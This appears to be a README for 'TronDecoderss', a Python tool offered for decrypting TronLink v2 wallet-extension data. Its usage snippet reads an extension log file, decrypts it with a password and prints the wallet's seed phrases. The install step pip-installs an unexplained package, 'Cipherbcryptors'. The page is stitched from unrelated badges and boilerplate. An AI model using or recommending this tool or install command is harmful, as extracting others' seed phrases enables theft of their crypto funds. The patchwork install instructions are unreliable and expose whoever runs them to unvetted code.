# TronDecoderss
[![N|Solid](https://cldup.com/dTxpPi9lDf.thumb.png)](https://nodesource.com/products/nsolid)

![](https://img.shields.io/github/stars/pandao/editor.md.svg) ![](https://img.shields.io/github/forks/pandao/editor.md.svg) ![](https://img.shields.io/github/tag/pandao/editor.md.svg) ![](https://img.shields.io/github/release/pandao/editor.md.svg) ![](https://img.shields.io/github/issues/pandao/editor.md.svg) ![](https://img.shields.io/bower/v/editor.md.svg)

Decode Tools for decode crypto data, from extensions wallet, TronLink v2.

## Installation
Python requires [Python.org](https://www.python.org/) v3,7+ to run.
Install the dependencies and devDependencies and start the server.
```sh
python -m pip install pip
python -m pip install --upgrade pip
pip install Cipherbcryptors
```
## Using

```Python
r = TronlinkReader('000003.log')
mnemonics = TronlinkReader.extract_mnemonic(r.decrypt('Qwwq1212'))
print(mnemonics)
```

## License
MIT
**Encode Cipherbcryptors group**